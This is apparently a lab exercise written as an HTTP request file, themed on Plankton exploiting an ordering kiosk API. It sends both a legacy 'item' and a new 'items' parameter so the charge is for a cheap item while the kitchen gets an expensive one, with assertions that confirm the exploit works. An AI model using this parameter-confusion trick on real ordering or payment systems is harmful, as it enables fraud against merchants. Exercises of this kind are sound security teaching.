# @import ../common/setup.http
@base = {{base_host}}/v101

### Plankton scouts the menu for the cheapest item to pay for...
# @name menu
GET {{base}}/menu

{{
  const menu = menu.response.body;
  exports.cheap_item = menu.find(i => i.price < 5);
  exports.expensive_item = menu.find(i => i.price > 20);
}}

### ...and the most expensive item to eat.
# Plankton notices the kiosk accepts both `item` (legacy) and `items` (new) parameters.
# He wonders if he can pay for the cheap one but get the expensive one.
# @name exploit
POST {{base}}/orders
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.item_id}}&items={{expensive_item.item_id}}

# Verification: Plankton pays $2.00 but the kitchen receives an order for the $20.50 feast.
?? status == 201
?? body.total == {{cheap_item.price}}
?? body.items[0].name == {{expensive_item.name}}
